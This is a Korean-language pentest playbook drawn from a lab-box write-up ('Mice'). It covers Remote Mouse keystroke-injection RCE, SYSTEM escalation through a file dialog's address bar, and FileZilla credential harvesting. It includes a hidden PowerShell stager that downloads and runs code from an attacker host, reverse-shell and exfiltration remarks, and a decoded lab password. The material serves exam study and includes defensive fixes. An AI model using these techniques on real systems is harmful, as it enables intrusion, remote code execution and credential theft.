> **증상** — 상위 권한을 GUI(RDP/VNC)에서 잡았는데, 파일을 빼낼 채널(SSH·HTTP·SMB)이 이미 죽어 있음. SYSTEM cmd 의 출력을 파일로 회수하지 못함.
>
> Mice 실측 — GUI 아이콘을 되살리려 `logoff`·재부팅을 쓰면서 **nc 리버스셸이 같이 죽었고**(`shell443.log` 마지막 기록 23:27:14), 재부팅 뒤 평문 스테이저 재주입 2회도 콜백 없음(`rce_retry.log` 23:39 · `shell443b.log` 23:43 은 `listening on ...` 한 줄뿐). SYSTEM 획득(00:05) 이후 작업이 전부 RDP GUI 안에서만 이뤄졌고 타겟→Kali 파일 채널이 없었음. 빼내려는 시도도 실패 — GUI 로 타이핑한 `ReadAllBytes(...)` 원라이너가 이스케이프가 깨져(`\x27`) 파서 에러로 죽음(`~/PG/Mice/rdp44.png`). `harvest_admin.txt` 가 **0바이트**인 것이 그 흔적 — 빈 파일이 아니라 「빈 응답을 받았다」는 기록.
> ⚠️ **Kali 접속이 끊긴 것이 아니다**(옛 노트 6장 서술은 반증됨). `rdp41~44.png` 가 00:05:12~00:11:20 에, `harvest_admin.txt` 가 00:10:35 에 Kali 에 기록됐고 `http.log` 에도 `[21/Aug/2026 00:08:08] "GET /harvest.ps1"` 이 남음. 끊긴 것은 **타겟에서 Kali 로 파일을 밀어 올릴 채널**임.
>
> **반사 — 상위 권한을 잡자마자 가장 먼저 할 일은 증거 한 화면 찍기다.** Mice 는 그것만 제때 해둔 덕에 플래그가 인정됐음. cmd 에서는 `;` 대신 `&`:
>
> ```powershell
> whoami & hostname & ipconfig | findstr IPv4 & date /t & time /t & type C:\Users\Administrator\Desktop\proof.txt
> ```
>
> **일반화** — 조작 채널만 살아 있으면 증거는 화면에 갇힌다. 회수 채널이 죽었는지를 **권한을 올리기 전에** 확인할 것.

- **지우기 전 원문** (옛 노트 6장):

> ### 원시 터미널 캡처가 없는 이유
>
> SYSTEM 획득 이후의 작업은 **RDP GUI 안에서만** 이뤄졌고, 그 시점에 Kali SSH 가 끊겨 있었다. 그래서 SYSTEM cmd 의 출력을 파일로 회수하지 못했다. 빼내려는 시도도 실패했다 — `~/PG/Mice/rdp44.png` 에 남은 것은 GUI 로 타이핑한 `ReadAllBytes(...)` 원라이너가 이스케이프가 깨져(`\x27`) 파서 에러로 죽은 화면이다. `harvest_admin.txt` 가 **0바이트**인 것이 그 흔적이다.
>
> 남은 증거는 **스크린샷뿐이고, 그것이 1차 사료다.** 4장의 코드블록은 그 스크린샷의 전사본이다.
>
> > [!warning] 여기서 배울 것
> > 증거 회수 경로(파일 exfil)와 조작 경로(GUI)가 **다른 채널**일 때, 조작 채널만 살아 있으면 증거는 화면에 갇힌다. 상위 권한을 잡자마자 **가장 먼저 할 일이 증거 한 화면 찍기**인 이유다 — 실제로 이 박스는 그것만 제때 해둔 덕에 플래그가 인정됐다.

⚠️ 「남은 증거는 스크린샷뿐이고 그것이 1차 사료다」는 **노트의 `Post-Exploitation` 에 남겼다**(전사본 라벨의 근거라 노트에서 뺄 수 없음).

---

### A-10 · 진입 배너가 「식별 결과」가 아닐 수 있다 — `?` 는 사전 출력이다

- **절**: 신규. nmap 오독 계열 절이 있으면 그 밑에 병합.
- **넣을 본문**:

> **증상** — nmap 이 `1979/tcp open unisql-java?` 처럼 서비스명을 찍어줌. 그 이름으로 익스플로잇을 찾기 시작함.
>
> **읽는 법** — **물음표는 nmap 이 배너를 못 받았다는 뜻**이고, 이름은 `nmap-services` 의 **포트번호 사전 항목을 그대로 출력한 것**임. 식별 결과가 아님. 직접 붙어보면 타임아웃임(`~/PG/Mice/banner_others.txt`).
>
> **정체는 셸을 잡은 뒤 `netstat -ano` 가 확정해 준다.** Mice 의 1978·1979·1980 은 전부 **PID 2640 = `RemoteMouse.exe`** 소유였음 — 세 포트가 한 앱의 것.
>
> **반사** — `?` 가 붙은 포트는 「모르는 서비스」로 두고 배너를 직접 받아볼 것. 사전 이름으로 searchsploit 을 돌리는 것은 시간 낭비.

- **지우기 전 원문** (옛 노트 1장 — **일부는 노트 `Service Enumeration` 에 남겼다**):

> **1979·1980 의 `unisql-java?`·`pearldoc-xact?` 는 식별 결과가 아니다.** 물음표는 nmap 이 배너를 못 받았다는 뜻이고, 이름은 `nmap-services` 의 포트번호 사전 항목을 그냥 출력한 것이다. 직접 TCP 로 붙어봤을 때 둘 다 recv 타임아웃이었다(`banner_others.txt`). 1978 만 배너를 뱉는다

---

## 2. `B. 기법 카드`

### B-1 · Remote Mouse / 원격제어 앱 — 키입력 주입으로 RCE (CVE-2022-3365 · EDB 46697)

- **절**: 신규.
- **넣을 본문**:

> **신호** — nmap 이 `remotemouse`·`Emote Remote Mouse` 를 찍음. 또는 1978~1980 대역이 열려 있음. Remote Mouse·Mobile Mouse·WiFi Mouse·Mini Mouse 계열은 전부 같은 부류(EDB 에 46697·51010·49601·49743 등).
>
> **원리** — 폰 앱이 PC 를 조종하는 도구. 설정에서 `Password for Connection` 을 비워 두면 기본 암호로 동작하고, 제어 프로토콜이 자명한 치환 암호로 평문 전송됨 → **누구나 키·마우스 이벤트를 주입할 수 있음.** 프로토콜에 `run` 명령은 없지만, **주입된 키가 콘솔 세션의 현재 사용자 컨텍스트로 들어가므로** 시작 메뉴에 명령을 타이핑하는 것이 곧 OS 명령 실행.
>
> **전제** — 콘솔에 로그인된 사용자가 있어야 함. Mice 는 `AutoAdminLogon=1` / `DefaultUserName=divine` 이라 성립.
>
> **프로토콜** — 배너·핸드셰이크는 **TCP** 1978(`SIN 15win nop nop 300`), 이벤트는 **UDP** 1978. 열거는 TCP 로, 공격은 UDP 로 하는 서비스가 있다는 예.
>
> **절차** — 마우스를 화면 좌하단으로 충분히 밀어(`move(-5000, 3000)`) 시작 버튼에 붙이고 클릭 → 검색창에 스테이저 타이핑 → Enter.
>
> ```bash
> python3 mice_type.py "powershell -nop -w hidden iex(irm http://<LHOST>/a)"
> ```
>
> `-nop` 은 프로필 로딩을 건너뛰어 시작을 빠르게 함(문자당 0.4초라 명령이 길수록 손해), `-w hidden` 은 PowerShell 창이 화면에 뜨는 것을 막음 — **화면이 그대로 노출되는 GUI 주입에서는 실용적인 차이**.
>
> **CVE 대응** — 이 결함은 **CVE-2022-3365**, PoC 는 **EDB 46697**(2019, CVE 배정보다 앞섬). Metasploit `exploit/windows/misc/remote_mouse_rce` 의 References 가 둘을 나란히 달고 있어 대응이 확정됨. ⚠️ **CVE-2021-43326 으로 적기 쉬운데 그 번호는 Automox Agent** 취약점임.

- **지우기 전 원문** (옛 노트 0장 · 2장):

> - **연결 암호가 비어 있는 원격제어 앱** — Remote Mouse 는 폰 앱이 PC 를 조종하는 도구다. 설정에서 "Password for Connection"을 비워두면 누구나 키입력을 주입할 수 있고, 시작 메뉴에 명령을 타이핑하는 것만으로 셸이 열린다. 이 박스는 비어 있었다(스크린샷 확인).

> 키코드는 자체 인코딩이다 — `key  7[ras]84` 가 소문자 `a`, `key  3RTN` 이 Enter. 마우스는 `mos  5m 1 0`(1픽셀 이동)·`mos  5R l d`/`l u`(좌클릭 다운/업). PoC 가 문자→키코드 표를 통째로 담고 있어 임의 문자열을 타이핑할 수 있다.
>
> 공격 아이디어는 그래서 이렇게 된다 — 마우스를 화면 좌하단(시작 버튼)으로 몰아넣고 클릭 → 시작 메뉴 검색창에 명령을 타이핑 → Enter. 시작 메뉴가 명령을 실행한다. `mice_type.py` 의 `move(-5000, 3000)` 이 그 "몰아넣기"다. 절대 좌표를 모르니 화면 밖으로 충분히 밀어 모서리에 붙이는 것.
>
> **주입된 키는 콘솔 세션의 현재 사용자 컨텍스트로 들어간다.** 이 박스는 AutoAdminLogon 으로 `divine` 이 자동 로그인돼 있어(`AutoAdminLogon REG_SZ 1` / `DefaultUserName REG_SZ divine`), 주입 결과가 `divine` 권한으로 실행된다.

> **UDP 스캔으로는 못 찾는다.** 상위 100 UDP 는 전부 무응답이었고(`nmap_udp.log`), 1978 은 애초에 상위 100 에 없다. 그런데 뒤에 나오듯 **키입력 주입 자체는 UDP 1978 로 나간다** — TCP 1978 은 배너/핸드셰이크용이다. 열거는 TCP 로 하고 공격은 UDP 로 하는 서비스가 있다는 걸 기억해 둘 것.

---

### B-2 · GUI 파일 대화상자 → 상위 권한 cmd

- **절**: 신규.
- **넣을 본문**:

> **신호** — SYSTEM/관리자 권한으로 도는 앱이 **파일 대화상자**(저장·열기·찾아보기 어디든)를 띄울 수 있음. Mice 는 Remote Mouse 3.008 의 `Image Transfer Folder` → `Change...`(CVE-2021-35448 / EDB 50047).
>
> **절차** — 대화상자의 **주소창(브레드크럼)** 을 클릭해 편집 모드로 만들고 `C:\Windows\System32\cmd.exe` 입력 → Enter. 탐색기가 그것을 「이동할 위치」로 해석하고, 대상이 실행 파일이면 실행함. ⚠️ **「파일 이름」 칸이 아니다**(A-7).
>
> **대화상자가 상위 권한인지 알아보는 신호** — 열자마자 `C:\WINDOWS\system32\config\systemprofile\Desktop is unavailable` 오류가 함께 뜨면 그 대화상자는 **SYSTEM 프로필에서 돈다.** 일반 사용자 프로세스는 그 경로를 홈으로 삼지 않음.
>
> **왜 SYSTEM 이 되는가 — 프로세스 트리로 확인.** 서비스(LocalSystem)가 GUI 를 **자식으로** 사용자 세션에 띄우면 Session 0 격리 우회임:
>
> ```powershell
> Name            : RemoteMouseService.exe
> ProcessId       : 2284
> SessionId       : 0
>
> Name            : RemoteMouse.exe
> ProcessId       : 2640
> ParentProcessId : 2284
> SessionId       : 1
> ```
>
> **부수 신호** — `Get-CimInstance Win32_Process` 의 `GetOwner` 가 Domain/User 를 **빈 문자열**로 돌려주면(`Owner=\`) 소유자가 없어서가 아니라 **내 권한으로는 조회할 수 없는 프로세스**라는 뜻임. 그 자체가 상위 권한 프로세스라는 신호.
>
> **전제** — GUI 클릭이 필요하므로 RDP/VNC 진입이 선행돼야 함.

- **지우기 전 원문** (옛 노트 0장 · 2장 · 4장):

> - **GUI 파일 대화상자를 통한 권한상승** — SYSTEM 으로 도는 앱이 띄운 "다른 이름으로 저장" 대화상자의 **주소창**에 `cmd.exe` 경로를 넣으면 SYSTEM cmd 가 뜬다.

> NVD 원문이 그대로 절차다 — *"Emote Interactive Remote Mouse 3.008 on Windows allows attackers to execute arbitrary programs as Administrator by using the Image Transfer Folder feature to navigate to cmd.exe."*
>
> Remote Mouse 는 **서비스**(`RemoteMouseService.exe`, LocalSystem)와 **GUI**(`RemoteMouse.exe`)로 나뉘고, 서비스가 GUI 를 사용자 세션에 SYSTEM 권한으로 띄운다(4장에서 PPID 로 확인). 그 GUI 설정의 "Image Transfer Folder" → `Change...` 를 누르면 **SYSTEM 소유의 "다른 이름으로 저장" 대화상자**가 뜬다. 이 대화상자의 **주소창**에 `C:\Windows\System32\cmd.exe` 를 입력하고 Enter 하면 탐색기가 그 경로를 **실행**해 SYSTEM cmd 가 뜬다.

---

### B-3 · Windows 설정 파일 자격증명 사냥 — 그리고 그 암호의 **주인**을 먼저 확정하라

- **절**: 신규. ⚠️ **A-24. 한 서비스의 거부는 자격증명의 오류가 아니다** 와 상호 링크할 것(같은 뿌리 — 「이 자격증명이 어디에 유효한가」).
- **넣을 본문**:

> **언제** — 토큰 특권·서비스 DACL·예약작업·`AlwaysInstallElevated`·SeriousSAM 이 전부 막혔을 때(A-41).
>
> **어디를 뒤지나** — FileZilla · PuTTY · WinSCP · `unattend.xml` · `sysprep.inf` · PowerShell 히스토리 · `cmdkey /list`.
> FileZilla: `%APPDATA%\FileZilla\recentservers.xml` · `sitemanager.xml`. 암호는 **base64**(암호화 아님):
>
> ```xml
> <User>divine</User>
> <Pass encoding="base64">Q29udHJvbEZyZWFrMTE=</Pass>
> ```
>
> ```bash
> echo Q29udHJvbEZyZWFrMTE= | base64 -d
> ```
>
> **⛔ 여기서 반사적으로 Administrator 재사용을 의심하고 달려들지 마라.** 온-박스에서 로컬 SAM 에 대고 직접 물어보면 10초에 끝남:
>
> ```powershell
> Add-Type -AssemblyName System.DirectoryServices.AccountManagement
> $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext("Machine")
> Write-Output ("--VALID-ADMIN=" + $ctx.ValidateCredentials("Administrator","<pw>"))
> Write-Output ("--VALID-DIVINE=" + $ctx.ValidateCredentials("<user>","<pw>"))
> ```
>
> Mice 결과는 `--VALID-ADMIN=False` / `--VALID-DIVINE=True` — **회수한 암호는 그 사용자 «자신의» Windows 암호였음.** 이걸 건너뛰었으면 freerdp 로 Administrator 를 계속 두드리며 시간을 태웠을 것.
>
> **그럼 쓸모는?** 「Administrator 암호가 아니다」가 「쓸모없다」는 아님. Mice 는 그 사용자가 `Remote Desktop Users` 소속이라 **RDP 로 GUI 세션에 진입**하는 데 썼고, 그게 GUI LPE 의 전제였음. **회수한 자격증명은 「어느 계정에」뿐 아니라 「어느 서비스에」 쓸 수 있는지도 같이 재라.**
>
> **원격 대안** — 445 가 열려 있으면 `nxc smb <ip> -u <user> -p <pw> --local-auth`.

- **지우기 전 원문** (옛 노트 0장 · 4장 · 7장):

> - **설정 파일에 박힌 자격증명** — FileZilla `recentservers.xml` 의 base64 암호. 다만 그게 **누구 암호인지**를 확인하는 절차가 이 박스의 진짜 교훈이다.

> ### 이 암호가 누구 것인지부터 확정한다
>
> FileZilla 암호가 나오면 반사적으로 Administrator 재사용을 의심하게 된다. 넘겨짚지 말고 온-박스에서 로컬 SAM 에 대고 직접 물어본다.

> **`ControlFreak11` 을 Administrator 암호로 오인하지 않은 것이 중요했다.** `ValidateCredentials` 로 `Administrator=False / divine=True` 를 확인해 **암호의 진짜 용도(=divine 의 RDP 로그인)를 특정**했다. 이걸 건너뛰었으면 freerdp 로 Administrator 를 계속 두드리며 시간을 태웠을 것이다.

> 3. **설정 파일 자격증명은 Windows 권한상승의 단골.** 표준 벡터(서비스 DACL·예약작업·토큰 특권)가 막히면 **FileZilla·PuTTY·WinSCP·unattend.xml·PowerShell 히스토리**를 뒤진다. FileZilla 는 `recentservers.xml`·`sitemanager.xml`(base64).
> 4. **자격증명이 나오면 "누구 것인가"를 먼저 확정.** `ValidateCredentials` (로컬) 또는 `nxc smb --local-auth` (원격, 445 열렸을 때). 재사용을 넘겨짚지 말 것.

---

## 3. `C` · `D` · `E` — OSCP 시험 관점

옛 노트 7장 8개 항목. 절 배분은 단독 기록자 판단에 맡긴다(체크리스트 성격이면 `D`, 반사 규칙이면 `C`).

- **절**: 신규 항목 8개. 이미 같은 취지의 줄이 있으면 **병합**할 것 — 특히 ②(egress 일괄 측정)와 ⑥(권한 올린 뒤 재열거)는 위 A-1·A-8 과 내용이 겹치므로 **A 쪽에 두고 C/D 에서는 한 줄 참조만** 두는 편이 낫다고 본다.
- **넣을 본문 = 지우기 전 원문**(옛 노트 7장 전문, 종결만 개조식으로):

> 1. **무인증 서비스를 만나면 공개 익스플로잇부터.** 배너가 명확하면 `searchsploit` 로 직행. 이 박스는 nmap 서비스명이 곧 익스플로잇 키워드였다. 단 **EDB 제목의 CVE 를 그대로 믿지 마라** — 여기 붙이기 쉬운 CVE-2021-43326 은 전혀 다른 제품이다. NVD 에서 제품명이 나오는지 한 번 확인하는 데 10초면 된다.
> 2. **셸이 안 붙으면 포트를 바꿔 찍지 말고 한 번에 재라.** 타겟에서 여러 포트로 아웃바운드를 시도해 결과를 HTTP 경로로 회신시키면 로그 한 줄에 전부 남는다(3장). 덤으로 Defender 실시간 보호 상태까지 같이 받아올 수 있다.
> 3. **설정 파일 자격증명은 Windows 권한상승의 단골.** 표준 벡터(서비스 DACL·예약작업·토큰 특권)가 막히면 **FileZilla·PuTTY·WinSCP·unattend.xml·PowerShell 히스토리**를 뒤진다. FileZilla 는 `recentservers.xml`·`sitemanager.xml`(base64).
> 4. **자격증명이 나오면 "누구 것인가"를 먼저 확정.** `ValidateCredentials` (로컬) 또는 `nxc smb --local-auth` (원격, 445 열렸을 때). 재사용을 넘겨짚지 말 것.
> 5. **파일 대화상자 → cmd.** SYSTEM/관리자 앱이 파일 대화상자를 띄우면(저장/열기/찾아보기 어디든) **주소창에 `cmd.exe` 경로** → 상위 권한 셸. GUI 클릭이 필요하니 RDP 진입이 전제.
> 6. **권한을 올렸으면 열거를 다시 돌려라.** 이 박스에서 같은 스크립트가 6,692행 → 9,282행이 됐다(6장). 저권한 결과의 빈칸은 "없음"이 아니라 "안 보임"이다.
> 7. **수동 대안**: Metasploit 없이 전 과정 수행했다. 리버스셸은 `msfvenom` 대신 난독화 PowerShell one-liner, 열거는 순수 cmdlet. Metasploit 에 `exploit/windows/misc/remote_mouse_rce`(References: EDB 46697 · CVE 2022-3365)가 있지만 **1대 한정** 제약을 여기 쓰기는 아까워 안 썼다.
> 8. **시간 배분**: 취약점 식별 <15분. 권한상승 **경로 식별**(FileZilla → CVE-2021-35448) 30분. 나머지는 헤드리스 RDP 세션 문제로 소진 — 실제 시험(mstsc 정상 접속)이라면 트레이 클릭 몇 번으로 끝난다. **GUI 가 안 보이면 `query session` 부터 쳐라.**

⚠️ **8번의 시간 수치는 파일 mtime 과 대조해 두었다.** 첫 스캔 22:20 → user 플래그 22:34(**14분**) → 권한상승 경로 확정 23:20(`writeup_notes.txt`) → SYSTEM 획득 2026-08-21 00:05(**45분 더**). 「식별 <15분 / 경로 식별 30분」은 실측과 맞고, 「나머지는 헤드리스 RDP 세션 문제로 소진」도 맞다(23:20~00:05 의 45분).

옛 0장의 남은 한 줄도 여기(시험 관점)로 간다:

> - **시험 출제 가능성**: 무인증 서비스 → 공개 익스플로잇 → 자격증명 회수 → 로컬 익스플로잇의 4단 체인은 OSCP 의 전형이다. 특히 "설정 파일에서 암호 찾기"와 "파일 대화상자 → cmd"는 Windows 권한상승의 반복 패턴이다.

---

## 4. 옛 8장(방어 관점) — `_PLAYBOOK` 이 아니라 노트의 `Vulnerability Fix:` 로 분산

이관이 아니라 **노트 안에서의 재배치**다. 손실 검산용으로 대응만 적는다.

| 옛 8장 원문 | 간 곳 |
|---|---|
| Remote Mouse 를 제거하거나 연결 암호를 설정한다(설정의 `Password for Connection`). CVE-2022-3365 의 핵심이 "암호를 안 걸면 기본값"이므로, 암호 설정만으로도 무인증 주입은 막힌다. 다만 프로토콜이 자명한 치환 암호를 평문으로 쓰므로 근본 대책은 제거·격리다. | `Initial Access` 4항목 `Vulnerability Fix:` 1번 불릿 |
| 서비스가 GUI 를 사용자 세션에 SYSTEM 으로 띄우지 않게 한다 — Session 0 격리 위반. 3.008 이후 버전으로 패치(CVE-2021-35448). | `Privilege Escalation` 4항목 `Vulnerability Fix:` 1번 불릿 |
| 자격증명을 앱 설정 파일에 평문/base64 로 저장하지 않는다. FileZilla 는 마스터 암호를 쓰거나 자격증명 관리자로 대체. | `Privilege Escalation` 4항목 `Vulnerability Fix:` 2번 불릿 |
| 자동 로그인(AutoAdminLogon) 지양. 이 박스는 자동 로그인 덕에 키입력 주입이 곧바로 대화형 사용자 컨텍스트를 얻었다. 콘솔에 로그인된 사용자가 없었다면 주입해도 실행할 셸이 없다. | `Initial Access` 4항목 `Vulnerability Fix:` 3번 불릿 |

「OS 계정 암호를 애플리케이션 저장소와 공유하지 말 것」은 **새로 추가한 것**이다 — `ValidateCredentials` 실측(FTP 암호 = Windows 로그인 암호)에서 직접 나온 것이라 근거가 있다.

---

## 5. 검산

| | |
|---|---|
| 이관 제안 건수 | **A 10건 · B 3건 · C/D/E 9건(7장 8개 + 0장 1개) = 22건** |
| 그중 기존 절 **병합** | 1건(A-41) + 병합 후보 표시 4건(A-1·A-2·A-10·C/D 의 ②⑥) |
| **신규**(번호 미배정) | 나머지 전부 |
| 노트에서 삭제한 장 | 0장 · 6장 · 7장 (8장은 §4 대로 노트 내 재배치) |
| 삭제 건수 = 제안 건수 | 옛 0장 4항목 → B-1·B-2·B-3·C/D/E 로 4건. 옛 6장 9개 문단 → A-1·A-2·A-3·A-4·A-5·A-6·A-7·A-8·A-9 로 9건. 옛 7장 8항목 → C/D/E 8건. **합 21건 + 옛 1장에서 옮긴 A-10 = 22건. 일치** |
| `[가정]` 보존 | 2건 전부 이관됨 — 평문 리버스셸 AMSI 추론(A-1) · 트레이 아이콘 렌더링 실패 메커니즘(A-3) |
| 인과 보존 | 「~해서 실패함」의 「~해서」를 전부 유지. 각 항목의 **지우기 전 원문**을 그대로 인용해 검산 가능 |
| 소요 시간 수치 | 옛 7장 8번의 시간 배분 그대로 + mtime 대조 결과 추가 |
| 출처 경로 | 모든 코드블록에 원 출처 경로를 유지 |

## 6. 노트에 남긴 것 — 이관하지 않은 판단

| 남긴 것 | 왜 |
|---|---|
| 「표준 벡터 전부 막힘」 소거 목록(`Privilege Escalation` 절 불릿 7개) | 「왜 이 경로였나」의 근거라 심사관이 필요로 함. `_PLAYBOOK` A-41 에는 **승격판**을 보냄 |
| harvest 6,692 → 9,282 실측 블록·스크린샷(`Post-Exploitation`) | SYSTEM 획득 직후의 1차 실측. A-8 은 「증상 → 반사」 승격판 |
| 원시 캡처 부재 사유(`Post-Exploitation`) | 전사본 라벨의 근거. A-9 는 일반화판 |
| 트레이 아이콘 문제 **한 줄**(`Privilege Escalation` 재현 절) | 재현 순서의 일부(리부트가 없으면 GUI 에 도달 못 함). 원인 분석 전량은 A-3 |
| 파일 대화상자 「주소창」 지정(재현 4단계) | 재현 절차 자체. 「파일 이름 칸에 먼저 넣어 실패했다」는 A-7 |
| EDB 50258·`freezeScript` 배제 **한 줄씩**(`## 관련` · 소거 목록) | 배제 사실은 다음 사람의 재탐색을 막음. 판정 근거 전량은 A-5·A-6 |
